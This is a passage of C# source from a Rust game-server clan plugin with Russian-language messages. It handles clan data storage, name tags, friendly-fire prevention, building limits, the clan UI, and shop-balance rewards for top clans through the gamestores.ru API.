                                obj.BroadcastLoc("playerpromotedowner", obj.GetColoredName(arg.Player().UserIDString, arg.Connection.username), obj.GetColoredName(lookingAtPlayer.UserIDString, obj.FindClanMember(lookingAtPlayer.UserIDString).Name));
                                obj.OnUpdate(true);
                            }
                            return false;
                        }
                    }
                }
            }

            return null;
        }

        void OnServerSave() => SaveData();
        void OnNewSave()
        {
            if (wipeClansOnNewSave) newSaveDetected = true;
            var Clans = from pair in clans orderby pair.Value.ClanPoints descending select pair;
            int z = 0;
            foreach (var item in Clans.Take(10))
            {
                foreach (var key in item.Value.members)
                {
                    TakeBalance(Convert.ToUInt64(key.Key), (Convert.ToInt32(Bonus.ElementAt(z)) / item.Value.members.Count()), (code) => { });
                }
                z++;
            }

        }


        void TakeBalance(ulong userId, int amount, Action<CallbackCode> callback)
        {
            ApiRequestBalance(userId.ToString(), amount.ToString(), callback);
        }

        public enum CallbackCode : byte
        {
            Ok = 0,
            Error = 1
        }

        void ApiRequestBalance(string playerId, string amount, Action<CallbackCode> callback)
        {
            string request = $"http://gamestores.ru/api?shop_id={shopid}&secret={secret}&action=moneys&type=plus&steam_id={playerId}&amount={amount}&mess=Награда за топ кланов";
            webrequest.Enqueue(request, null, (code, response) =>
            {
                // PrintWarning($"Code - {code}, resp - {response}");
                var responseParsed = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
                if (responseParsed["result"] != "success")
                {
                    PrintError($"{request}\nCODE {code}: {response}");
                    callback.Invoke(CallbackCode.Error);
                    return;
                }
                if (code != 200 && code != 201)
                {
                    PrintError($"{request}\nCODE {code}: {response}");
                    callback.Invoke(CallbackCode.Error);
                }
                else
                {
                    callback?.Invoke(CallbackCode.Ok);
                    // success = true;
                }

                // if (code == 201)
                // {
                //     PrintWarning($"code - {code}, resp - {response}");
                //     PrintWarning("Plugin not working. Add Gamestores shop info into config!");
                //     Interface.Oxide.UnloadPlugin(Title);
                // }
            }, this, Core.Libraries.RequestMethod.GET);
        }


        void Unload()
        {
            if (!Initialized) return;
            SaveData();

            foreach (BasePlayer player in BasePlayer.activePlayerList.ToList())
                DoCleanUp(player);
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "MainTop");
            }

            foreach (BasePlayer player in BasePlayer.sleepingPlayerList.ToList())
                DoCleanUp(player);

            foreach (BasePlayer player in BasePlayer.sleepingPlayerList.ToList())
                CuiHelper.DestroyUi(player, "Clan.NewLayer");


        }

        [ChatCommand("fast")]
        void cmdfast(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "Clan.NewLayer");
        }

        private void DoCleanUp(BasePlayer player)
        {
            if (player == null)
                return;

            Clan clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                if (useRelationshipManager)
                {
                    RelationshipManager.PlayerTeam playerTeam = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                    playerTeam?.RemovePlayer(player.userID);

                    player.ClearTeam();
                    RelationshipManager.ServerInstance.playerToTeam.Remove(player.userID);
                }

                if (enableClanTagging)
                {
                    string name = player.displayName.Replace($"{clanTagOpening}{clan.tag}{clanTagClosing} ", "");
                    player.displayName = name;

                    if (player.net != null)
                        player._name = string.Format("{1}[{0}/{2}]", player.net.ID, name, player.userID);
                }

                if (!Interface.Oxide.IsShuttingDown)
                {
                    if (forceNametagsOnTagging)
                        player.limitNetworking = true;

                    player.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);

                    if (forceNametagsOnTagging)
                        player.limitNetworking = false;
                }
            }
        }


        private object LoadData()
        {
            StoredData protoStorage = new StoredData();
            StoredData jsonStorage = new StoredData();
            StoredData oldStorage = new StoredData();
            bool protoFileFound = ProtoStorage.Exists(new string[] { Title });
            bool jsonFileFound = Interface.GetMod().DataFileSystem.ExistsDatafile(Title);
            bool oldFileFound = Interface.GetMod().DataFileSystem.ExistsDatafile("rustio_clans");
            if (!protoFileFound && !jsonFileFound)
            {
                oldStorage = Interface.GetMod().DataFileSystem.ReadObject<StoredData>("rustio_clans");
            }
            else
            {
                if (jsonFileFound)
                    jsonStorage = Interface.GetMod().DataFileSystem.ReadObject<StoredData>(Title);

                if (protoFileFound)
                {
                    protoStorage = ProtoStorage.Load<StoredData>(new string[]
                      {
                        Title
                      });
                }
            }

            bool lastwasProto = protoStorage.lastStorage == "proto" && (protoStorage.saveStamp > jsonStorage.saveStamp || protoStorage.saveStamp > oldStorage.saveStamp);

            if (useProtostorageClandata)
            {
                if (lastwasProto)
                {
                    clanSaves = ProtoStorage.Load<StoredData>(new string[] { Title }) ?? new StoredData();
                }
                else
                {
                    if (oldFileFound && !jsonFileFound)
                        clanSaves = Interface.GetMod().DataFileSystem.ReadObject<StoredData>("rustio_clans");

                    if (jsonFileFound)
                        clanSaves = Interface.GetMod().DataFileSystem.ReadObject<StoredData>(Title);
                }
            }
            else
            {
                if (!lastwasProto)
                {
                    if (oldFileFound && !jsonFileFound)
                        clanSaves = Interface.GetMod().DataFileSystem.ReadObject<StoredData>("rustio_clans");

                    if (jsonFileFound)
                        clanSaves = Interface.GetMod().DataFileSystem.ReadObject<StoredData>(Title);
                }
                else if (protoFileFound)
                {
                    clanSaves = ProtoStorage.Load<StoredData>(new string[] { Title }) ?? new StoredData();
                }
            }

            if (wipeClansOnNewSave && newSaveDetected)
            {
                if (useProtostorageClandata)
                    ProtoStorage.Save<StoredData>(clanSaves, new string[] { Title + ".bak" });
                else Interface.Oxide.DataFileSystem.WriteObject(Title + ".bak", clanSaves);

                Puts("New save detected > Created backup of clans and wiped datafile");
                clans = new Dictionary<string, Clan>();
                clansSearch = new Dictionary<string, string>();
                return null;
            }

            clans = new Dictionary<string, Clan>();
            clansSearch = new Dictionary<string, string>();

            if (clanSaves.clans == null || clanSaves.clans.Count == 0)
                return null;

            clans = clanSaves.clans;
            return !jsonFileFound && !protoFileFound;
        }

        void InitializeClans(bool newFileFound)
        {
            Dictionary<string, int> clanDuplicates = new Dictionary<string, int>();
            List<string> clanDuplicateCount = new List<string>();
            foreach (var _clan in clans.ToList())
            {
                Clan clan = _clan.Value;
                if (purgeOldClans && (UnixTimeStampUTC() - clan.updated) > (notUpdatedSinceDays * 86400))
                {
                    purgedClans.Add($"[{clan.tag}] | {clan.description} | Owner: {clan.owner} | LastUpd: {UnixTimeStampToDateTime(clan.updated)}");
                    if (permission.GroupExists(permGroupPrefix + clan.tag))
                    {
                        foreach (var member in clan.members)
                            if (permission.UserHasGroup(member.Key, permGroupPrefix + clan.tag))
                                permission.RemoveUserGroup(member.Key, permGroupPrefix + clan.tag);
                        permission.RemoveGroup(permGroupPrefix + clan.tag);
                    }
                    RemoveClan(clan.tag);
                    continue;
                }
                foreach (var member in clan.members.ToList())
                {
                    var p = covalence.Players.FindPlayerById(member.Key);
                    if (!(p is IPlayer) || p == null || p.Name == "")
                    {
                        clan.members.Remove(member.Key);
                        clan.moderators.Remove(member.Key);
                    }
                }
                if (clan.members.Count() == 0)
                {
                    RemoveClan(clan.tag);
                    continue;
                }
                if (!clan.members.ContainsKey(clan.owner)) clan.owner = clan.members.ToList()[0].Key;
                if (usePermGroups && !permission.GroupExists(permGroupPrefix + clan.tag)) permission.CreateGroup(permGroupPrefix + clan.tag, "Clan " + clan.tag, 0);
                foreach (var member in clan.members)
                {
                    if (usePermGroups && !permission.UserHasGroup(member.Key, permGroupPrefix + clan.tag)) permission.AddUserGroup(member.Key, permGroupPrefix + clan.tag);
                }
                foreach (var invited in clan.invites.ToList())
                {
                    if ((UnixTimeStampUTC() - (int)invited.Value) > (inviteValidDays * 86400)) clan.invites.Remove(invited.Key);
                }
                clanCache[clan.owner] = clan;
                foreach (var member in clan.members)
                {
                    if (!clanDuplicates.ContainsKey(member.Key))
                    {
                        clanDuplicates.Add(member.Key, 1);
                        clanCache[member.Key] = clan;
                        continue;
                    }
                    else
                    {
                        clanDuplicates[member.Key] += 1;
                        if (!clanDuplicateCount.Contains(member.Key)) clanDuplicateCount.Add(member.Key);
                    }
                    clanCache[member.Key] = clan;
                }
                foreach (var invite in clan.invites)
                {
                    if (!pendingPlayerInvites.ContainsKey(invite.Key)) pendingPlayerInvites.Add(invite.Key, new List<string>());
                    pendingPlayerInvites[invite.Key].Add(clan.tag);
                }
                var reply = 5792;

                clan.total = clan.members.Count();
                clan.mods = clan.moderators.Count();
                if (clan.created == 0) clan.created = UnixTimeStampUTC();
                if (clan.updated == 0) clan.updated = UnixTimeStampUTC();
                if (!clansSearch.ContainsKey(clan.tag.ToLower())) clansSearch.Add(clan.tag.ToLower(), clan.tag);
            }
            if (clanDuplicateCount.Count > 0) PrintWarning($"Found '{clanDuplicateCount.Count()}' player(s) in multiple clans. Check `clans.showduplicates`");
            Puts($"Loaded data with '{clans.Count}' valid Clans and overall '{clanCache.Count}' Members.");
            if (newFileFound) SaveData(true);
        }
        void SaveData(bool force = false)
        {
            if (!Initialized && !force) return;
            clanSaves.clans = clans;
            clanSaves.saveStamp = UnixTimeStampUTC();
            clanSaves.lastStorage = useProtostorageClandata ? "proto" : "json";
            if (useProtostorageClandata)
                ProtoStorage.Save<StoredData>(clanSaves, new string[] { this.Title });

            else Interface.Oxide.DataFileSystem.WriteObject(this.Title, clanSaves);
        }
        public Clan findClan(string tag)
        {
            Clan clan;
            if (TryGetClan(tag, out clan)) return clan;
            return null;
        }

        public Clan findClanByUser(string userId)
        {
            Clan clan;
            if (clanCache.TryGetValue(userId, out clan)) return clan;
            return null;
        }

        private Clan SetupPlayer(BasePlayer player, IPlayer current = null, bool hasLeft = false, Clan clan = null, bool teamForced = false, string oldTag = null)
        {
            if (player == null)
                return null;

            if (current == null)
                current = covalence.Players.FindPlayerById(player.UserIDString);

            if (current == null)
                return null;

            bool prevName = false;

            if (clan == null && !hasLeft)
                clan = findClanByUser(current.Id);

            bool flag = false;
            string oldName = player.displayName;
            player.displayName = oldName;
            player._name = oldName;


            if (clan == null || hasLeft)
            {
                if (enableClanTagging && hasLeft && oldTag != null)
                {
                    string name = player.displayName.Replace($"{clanTagOpening}{oldTag}{clanTagClosing} ", "");
                    player.displayName = name;
                    player._name = string.Format("{1}[{0}/{2}]", player.net.ID, name, player.userID);
                    prevName = true;
                }

                if (useRelationshipManager)
                    flag = NullClanTeam(player);
                clan = null;
            }
            else
            {
                if (enableClanTagging)
                {
                    string name = player.displayName.Replace($"{clanTagOpening}{(oldTag != null ? oldTag : clan.tag)}{clanTagClosing} ", "");
                    name = $"{clanTagOpening}{clan.tag}{clanTagClosing} {name}";
                    player.displayName = name;
                    player._name = string.Format("{1}[{0}/{2}]", player.net.ID, name, player.userID);
                    prevName = true;
                }

                clan.AddBasePlayer(player);
            }

            if (prevName && forceNametagsOnTagging)
                player.limitNetworking = true;

            if (flag || prevName)
                player.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);

            if (prevName && forceNametagsOnTagging)
                player.limitNetworking = false;

            return clan;
        }

        private bool NullClanTeam(BasePlayer player)
        {
            bool flag = false;
            if (player.currentTeam != 0UL)
            {
                RelationshipManager.PlayerTeam team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                if (team == null)
                {
                    player.currentTeam = 0UL;
                    player.ClientRPCPlayer(null, player, "CLIENT_ClearTeam");
                    flag = true;
                }
            }
            else if (player.currentTeam == 0UL)
            {
                player.ClientRPCPlayer(null, player, "CLIENT_ClearTeam");
                flag = true;
            }

            return flag;
        }

        void setupPlayers(List<string> playerIds, bool remove, string tag)
        {
            if (enableClanTagging) foreach (var playerId in playerIds)
                {
                    var player = BasePlayer.Find(playerId);
                    if (player != null) SetupPlayer(player, null, remove, null, false, tag);
                }
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (player == null || player.net == null || player.net.connection == null)
                return;

            Clan clan = SetupPlayer(player);

            if (clan != null)
                ServerMgr.Instance.StartCoroutine(WaitForReady(player, clan));
        }

        IEnumerator WaitForReady(BasePlayer player, Clan clan = null)
        {
            yield return new WaitWhile(new System.Func<bool>(() => player.IsReceivingSnapshot && player.IsSleeping()));
            if (player.IsDead()) yield return null;
            ComingOnlineInfo(player, clan);


            yield return null;
        }
        void ComingOnlineInfo(BasePlayer player, Clan clan = null)
        {
            if (player == null) return;
            if (clan != null)
            {
                if (enableComesOnlineMsg) clan.BroadcastLoc("comeonline", clan.ColNam(player.UserIDString, player.net.connection.username), "", "", "", player.UserIDString);
                if (enableWhoIsOnlineMsg)
                {
                    var sb = new StringBuilder();
                    sb.Append($"<color={colorTextMsg}>");
                    sb.Append(string.Format(msg("memberon", player.UserIDString)));
                    int n = 0;
                    foreach (var memberId in clan.members)
                    {
                        var op = this.covalence.Players.FindPlayerById(memberId.Key);
                        if (op != null && op.IsConnected)
                        {
                            var memberName = op.Name;
                            if (op.Name == player.net.connection.username) memberName = msg("yourname", player.UserIDString);
                            if (n > 0) sb.Append(", ");
                            if (clan.IsOwner(memberId.Key))
                            {
                                sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanOwnerColor, memberName));
                            }
                            else if (clan.IsCouncil(memberId.Key))
                            {
                                sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanCouncilColor, memberName));
                            }
                            else if (clan.IsModerator(memberId.Key))
                            {
                                sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanModeratorColor, memberName));
                            }
                            else
                            {
                                sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanMemberColor, memberName));
                            }
                            ++n;
                        }
                    }
                    sb.Append($"</color>");
                    PrintChat(player, sb.ToString().TrimEnd());
                }
                clan.updated = UnixTimeStampUTC();
                manuallyEnabledBy.Remove(player.userID);
                if (enableClanAllies && (clan.IsOwner(player.UserIDString) || clan.IsCouncil(player.UserIDString)) && clan.pendingInvites.Count > 0)
                {
                    if (player != null) PrintChat(player, string.Format(msg("allyPendingInfo", player.UserIDString)));
                }
                return;
            }
            if (pendingPlayerInvites.ContainsKey(player.UserIDString))
            {
                foreach (var invitation in pendingPlayerInvites[player.UserIDString] as List<string>)
                {
                    Clan newclan = findClan(invitation);
                    if (newclan != null) timer.Once(3f, () =>
                    {
                        if (player != null) PrintChat(player, string.Format(msg("claninvite", player.UserIDString), newclan.tag, newclan.description, colorCmdUsage));
                    }
                     );
                }
            }
        }


        void OnPlayerDisconnected(BasePlayer player)
        {
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                clan.BroadcastLoc("goneoffline", clan.ColNam(player.UserIDString, player.net.connection.username), "", "", "", player.UserIDString);
                manuallyEnabledBy.Remove(player.userID);
            }
        }

        void OnPlayerDeath(BasePlayer player, HitInfo info)
        {
            if (player == null || info == null || !player.IsConnected) return;

            var clan = findClanByUser(player.UserIDString);
            if (clan != null && info.InitiatorPlayer != null && clan.members.ContainsKey(player.UserIDString))
            {
                clan.ClanPoints -= PointsOfDeath;
                clan.DeathC++;
                clan.members[player.UserIDString].PlayerPoints -= PointsOfDeath;
                clan.members[player.UserIDString].Death++;
            }
        }
        void OnPlayerAttack(BasePlayer attacker, HitInfo hit)
        {
            if (!enableFFOPtion || attacker == null || hit == null || !(hit.HitEntity is BasePlayer)) return;
            OnAttackShared(attacker, hit.HitEntity as BasePlayer, hit);
        }



        void OnEntitySpawned(BaseEntity entity)
        {
            var player = BasePlayer.FindByID(entity.OwnerID);
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (entity.PrefabName.Contains("autoturret_deployed"))
            {
                clan.turret++;
                player.ChatMessage($"Лимит вашего клана на турели: <color=#8cc83cff>{clan.turret}/{turretlimit}</color>");

            }
            if (entity.PrefabName.Contains("cupboard.tool"))
            {

                clan.CupCount++;
                player.ChatMessage($"Лимит вашего клана на шкафы: <color=#8cc83cff>{clan.CupCount}/{cuplimit}</color>");

            }
            if (entity.PrefabName.Contains("assets/prefabs/building core"))
            {
                clan.obj++;
                player.ChatMessage($"Лимит вашего клана на строительные блоки: <color=#8cc83cff>{clan.obj}/{objectslimit}</color>");

            }
        }



        private readonly object True = true;

        private object OnSamSiteTarget(SamSite samSite, BaseCombatEntity target)
        {
            var mountPoints = (target as BaseVehicle)?.mountPoints;
            if (!IsOccupied(target, mountPoints))
                return True;

            if (samSite.staticRespawn)
                return null;

            var cupboard = samSite.GetBuildingPrivilege(samSite.WorldSpaceBounds());
            if ((object)cupboard == null)
                return null;

            if (mountPoints != null)
            {
                foreach (var mountPoint in mountPoints)
                {
                    var player = mountPoint.mountable.GetMounted();
                    if ((object)player != null && IsAuthed(cupboard, player.userID))
                        return True;
                }
            }

            foreach (var child in target.children)
            {
                var player = child as BasePlayer;
                if ((object)player != null)
                {
                    if (IsAuthed(cupboard, player.userID))
                        return True;
                }
            }

            return null;
        }

        private static bool IsOccupied(BaseCombatEntity entity, List<MountPointInfo> mountPoints)
        {
            if (mountPoints != null)
            {
                foreach (var mountPoint in mountPoints)
                {
                    var player = mountPoint.mountable.GetMounted();
                    if ((object)player != null)
                        return true;
                }
            }

            foreach (var child in entity.children)
            {
                if (child is BasePlayer)
                    return true;
            }

            return false;
        }

        private static bool IsAuthed(BuildingPrivlidge cupboard, ulong userId)
        {
            foreach (var entry in cupboard.authorizedPlayers)
            {
                if (entry.userid == userId)
                    return true;
            }

            return false;
        }

        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hit)
        {
            try
            {
                if (entity == null || hit == null) return;
                if (entity is BaseHelicopter && hit.Initiator is BasePlayer)
                    LastHeliHit[entity.net.ID] = hit.InitiatorPlayer.userID;
                if (entity is BradleyAPC && hit.Initiator is BasePlayer)
                    LastBradleyAPCHit[entity.net.ID] = hit.InitiatorPlayer.userID;

                if (!enableFFOPtion || !(entity is BasePlayer) || !(hit.Initiator is BasePlayer)) return;
                OnAttackShared(hit.Initiator as BasePlayer, entity as BasePlayer, hit);
            }
            catch (NullReferenceException)
            { }
        }
        object OnAttackShared(BasePlayer attacker, BasePlayer victim, HitInfo hit)
        {
            if (bypass.Contains(victim.userID) || attacker == victim) return null;
            var victimClan = findClanByUser(victim.UserIDString);
            var attackerClan = findClanByUser(attacker.UserIDString);
            if (victimClan == null || attackerClan == null) return null;
            if (victimClan.tag == attackerClan.tag)
            {
                if (manuallyEnabledBy.Contains(attacker.userID) && !forceClanFFNoDeactivate) return null;
                DateTime now = DateTime.UtcNow;
                DateTime time;
                var key = attacker.UserIDString + "-" + victim.UserIDString;
                if (!notificationTimes.TryGetValue(key, out time) || time < now.AddSeconds(-friendlyFireNotifyTimeout))
                {
                    PrintChat(attacker, string.Format(msg("friendlyfire", attacker.UserIDString), victim.displayName, colorCmdUsage));
                    notificationTimes[key] = now;
                }
                hit.damageTypes = new DamageTypeList();
                hit.DidHit = false;
                hit.HitEntity = null;
                hit.Initiator = null;
                hit.DoHitEffects = false;
                return false;
            }
            if (victimClan.tag != attackerClan.tag && enableClanAllies && enableAllyFFOPtion)
            {
                if (!victimClan.clanAlliances.Contains(attackerClan.tag)) return null;
                if (manuallyEnabledBy.Contains(attacker.userID) && !forceAllyFFNoDeactivate) return null;
                DateTime now = DateTime.UtcNow;
                DateTime time;
                var key = attacker.UserIDString + "-" + victim.UserIDString;
                if (!notificationTimes.TryGetValue(key, out time) || time < now.AddSeconds(-friendlyFireNotifyTimeout))
                {
                    PrintChat(attacker, string.Format(msg("allyfriendlyfire", attacker.UserIDString), victim.displayName));
                    notificationTimes[key] = now;
                }
                hit.damageTypes = new DamageTypeList();
                hit.DidHit = false;
                hit.HitEntity = null;
                hit.Initiator = null;
                hit.DoHitEffects = false;
                return false;
            }
            return null;
        }
        void AllyRemovalCheck()
        {
            foreach (var ally in clans)
            {
                try
                {
                    Clan allyClan = clans[ally.Key];
                    foreach (var clanAlliance in allyClan.clanAlliances.ToList())
                    {
                        if (!clans.ContainsKey(clanAlliance)) allyClan.clanAlliances.Remove(clanAlliance);
                    }
                    foreach (var invitedAlly in allyClan.invitedAllies.ToList())
                    {
                        if (!clans.ContainsKey(invitedAlly)) allyClan.clanAlliances.Remove(invitedAlly);
                    }
                    foreach (var pendingInvite in allyClan.pendingInvites.ToList())
                    {
                        if (!clans.ContainsKey(pendingInvite)) allyClan.clanAlliances.Remove(pendingInvite);
                    }
                }
                catch
                {
                    PrintWarning("Ally removal check failed. Please contact the developer.");
                }
            }
        }
        void cmdChatClan(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (args.Length == 0)
            {
                cmdClanOverview(player);
                return;
            }
            string opt = args[0];
            if (opt == msg("clanArgCreate", player.UserIDString))
            {
                cmdClanCreate(player, args);
                return;
            }
            else if (opt == msg("clanArgInvite", player.UserIDString))
            {
                cmdClanInvite(player, args);
                return;
            }
            else if (opt == msg("clanArgWithdraw", player.UserIDString))
            {
                cmdClanWithdraw(player, args);
                return;
            }
            else if (opt == msg("clanArgJoin", player.UserIDString))
            {
                cmdClanJoin(player, args);
                return;
            }
            else if (opt == msg("clanArgPromote", player.UserIDString))
            {
                cmdClanPromote(player, args);
                return;
            }
            else if (opt == msg("clanArgDemote", player.UserIDString))
            {
                cmdClanDemote(player, args);
                return;
            }
            else if (opt == msg("clanArgLeave", player.UserIDString))
            {
                cmdClanLeave(player, args);
                return;
            }
            else if (opt == msg("clanArgFF", player.UserIDString))
            {
                if (!enableFFOPtion) return;
                cmdChatClanFF(player, command, args);
                return;
            }
            else if (opt == msg("clanArgAlly", player.UserIDString))
            {
                if (!enableClanAllies) return;
                for (var i = 0;
                i < args.Length - 1;
                ++i)
                {
                    if (i < args.Length) args[i] = args[i + 1];
                }
                Array.Resize(ref args, args.Length - 1);
                cmdChatClanAlly(player, command, args);
                return;
            }
            else if (opt == msg("clanArgKick", player.UserIDString))
            {
                cmdClanKick(player, args);
                return;
            }
            else if (opt == msg("clanArgDisband", player.UserIDString))
            {
                cmdClanDisband(player, args);
                return;
            }
            else cmdChatClanHelp(player, command, args);
        }
        void ChatPoint(BasePlayer player)
        {
            bool TurnirCan = false;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (clan.ClanPoints >= 2000)
            {
                TurnirCan = true;
            }
            else
            {
                TurnirCan = false;
            }
        }

        public string Main = "Clan.NewLayer";
        public string MainLayer = "Clan.NewLayer1";

        public string PointLayer = "PointLayer";


        bool CheckPoint(ulong owner)
        {
            var clan = findClanByUser(owner.ToString());
            if (clan == null)
            {
                return false;
            }
            if (clan.ClanPoints < 2000)
            {
                return false;
            }
            return true;
        }

        private string GetItemName(string shortname)
        {
            if (shortname.ToLower() == "loot-barrel") return "Бочки";
            if (shortname.ToLower() == "wood") return "Дерево";
            if (shortname.ToLower() == "stones") return "Камень";
            if (shortname.ToLower() == "metal.ore") return "Металл";
            if (shortname.ToLower() == "sulfur.ore") return "Сера";
            if (shortname.ToLower() == "hq.metal.ore") return "МВК";
            if (shortname.ToLower() == "fat.animal") return "Жир";
            if (shortname.ToLower() == "cloth") return "Ткань";
            if (shortname.ToLower() == "leather") return "Кожа";
            if (shortname.ToLower() == "scrap") return "Скрап";
            if (shortname.ToLower() == "gears") return "Шестерни";
            if (shortname.ToLower() == "techparts") return "Микросхемы";
            if (shortname.ToLower() == "metalpipe") return "Трубы";
            return "";
        }

        void NewClanUI(BasePlayer player, int page = 0)
        {
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            CuiHelper.DestroyUi(player, "MainClan");
            CuiHelper.DestroyUi(player, "MainTop");
            CuiHelper.DestroyUi(player, "MainClans");
            CuiHelper.DestroyUi(player, "MainChange");
            CuiHelper.DestroyUi(player, "MainSkins");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = $"{HexToRustFormat("#322D2499")}", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", "MainClan");

            UI.AddButton(ref container, "MainClan", "CloseOverlay", "", "MainClan", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "MainClan", "ClanGUIParent", "0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-410 -310", "410 310");

            #region UpperPanel

            UI.AddImage(ref container, "ClanGUIParent", "UpperPanel", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", "-404 131", "137 307");
            if (clan.ClanAvatar.Contains("png") == false || clan.ClanAvatar.Contains("jpg") == false)
            {
                UI.AddRawImage(ref container, "UpperPanel", "Avatar", GetImageUrl(clan.owner, 0), $"1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-245 -63", "-119 64");
            }
            else
            {
                UI.AddRawImage(ref container, "UpperPanel", "Avatar", ImageLibrary?.Call<string>("GetImage", clan.ClanAvatar), $"1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-245 -63", "-119 64");
            }

            Dictionary<string, string> texts = new Dictionary<string, string>()
            {
                { "НАЗВАНИЕ КЛАНА", clan.tag.ToUpper() },
                { "ГЛАВА КЛАНА", clan.ownerName.ToUpper() },
                { "УЧАСТНИКОВ В ИГРЕ", $"{clan.online} из {clan.total}" },
                { "ВЫПОЛНЕННАЯ НОРМА", $"{GetFullClanPercent(clan.tag)}%" }
            };

            double offsetminh = 32;
            double offsetmaxh = 54;

            foreach (KeyValuePair<string, string> kvp in texts)
            {
                string text = kvp.Key;
                string text2 = kvp.Value;

                UI.AddImage(ref container, "UpperPanel", "ClanInfo", $"{HexToRustFormat("#1E20246E")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", $"-99 {offsetminh}", $"247 {offsetmaxh}");
                UI.AddText(ref container, "ClanInfo", $"{text}", "1 1 1 0.8", $"{text}", TextAnchor.MiddleLeft, 14, "0 0", "0 0", "5 0", "200 20");
                UI.AddText(ref container, "ClanInfo", $"{text2}", "1 1 1 0.8", $"{text2}", TextAnchor.MiddleRight, 14, "1 0", "1 0", "-150 0", "-5 20");

                offsetminh -= 24;
                offsetmaxh -= 24;
            }
            #endregion

            #region Tasks

            int AllNeed = 0, AllComplete = 0;
            foreach (var item in clan.Change)
            {
                AllNeed += item.Value.Need;
                AllComplete += item.Value.Complete;
            }
            UI.AddImage(ref container, "ClanGUIParent", "TasksParent", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", "140 131", "407 307");
            UI.AddText(ref container, "TasksParent", "Title", "1 1 1 0.8", $"ТЕКУЩАЯ ЗАДАЧА", TextAnchor.UpperCenter, 21, "0.5 0.5", "0.5 0.5", "-100 50", "100 90");
            UI.AddImage(ref container, "TasksParent", "TasksInfo", $"{HexToRustFormat("#1E20246E")}", "", "", "0.5 0.5", "0.5 0.5", "-115 -75", "115 60");
            if (AllNeed == 0)
                UI.AddText(ref container, "TasksInfo", "NotSetted", "1 1 1 0.8", $"Глава клана не указал текущую задачу", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            else
            {
                double offsethmin = 22, offsethmax = 62, offsetlmin = -104, offsetlmax = -63;
                int l = 0;
                foreach (var item in clan.Change)
                {
                    UI.AddImage(ref container, "TasksInfo", "NeedItem", $"{HexToRustFormat("#4E4A477D")}", "", "", "0.5 0.5", "0.5 0.5", $"{offsetlmin} {offsethmin}", $"{offsetlmax} {offsethmax}");
                    UI.AddRawImage(ref container, "NeedItem", "NeedIMG", GetImageUrl(item.Key, 0), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                    UI.AddText(ref container, "NeedItem", "NeedAmount", "1 1 1 0.8", $"{item.Value.Need}", TextAnchor.MiddleRight, 8, "0 0", "0 0", "0 0", "33 10");
                    offsetlmin += 42;
                    offsetlmax += 42;
                    if (l == 4)
                    {
                        offsetlmin = -104;
                        offsetlmax = -63;
                        offsethmin -= 42;
                        offsethmax -= 42;
                        l = 0;
                    }
                    else
                    {
                        l++;
                    }
                }

            }

            #endregion


            #region ClanSkins

            UI.AddImage(ref container, "ClanGUIParent", "ClanSkinsParent", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.png", "0.5 0.5", "0.5 0.5", "-404 -18", "407 128");
            int skinCount = 0;
            UI.AddText(ref container, "ClanSkinsParent", "Title", "1 1 1 0.8", $"НАБОР КЛАНОВОЙ ОДЕЖДЫ", TextAnchor.MiddleCenter, 21, "0.5 0.5", "0.5 0.5", "-200 35", "200 85");

            double offsetxmin = -375, offsetxmax = -274;

            foreach (var type in clan.SkinList)
            {
                foreach (var skin in type.Value)
                {
                    string command = $"clans_getskinIds {skin.Key} 0";
                    if (skinCount == 6)
                    {
                        break;
                    }
                    UI.AddImage(ref container, "ClanSkinsParent", "ClanSkin", $"{HexToRustFormat("#4E4A477D")}", "", "", "0.5 0.5", "0.5 0.5", $"{offsetxmin} -58", $"{offsetxmax} 44");
                    UI.AddRawImage(ref container, "ClanSkin", "SkinIMG", GetImageSkin(skin.Key, skin.Value), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                    if (clan.owner.Contains(player.UserIDString))
                    {
                        UI.AddButton(ref container, "ClanSkin", "SetSkin", $"{command}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
                    }
                    offsetxmin += 130;
                    offsetxmax += 130;
                    skinCount++;
                }
            }


            #endregion

            #region LowerPanel

            UI.AddImage(ref container, "ClanGUIParent", "LowerPanel", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.png", "0 0", "0 0", "6 6", "547 289");
            UI.AddImage(ref container, "LowerPanel", "Title", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-270 124", "270 144");
            UI.AddText(ref container, "Title", "Status", "1 1 1 0.8", $"#", TextAnchor.LowerCenter, 14, "0 0", "0 0", "0 -2", "30 20");
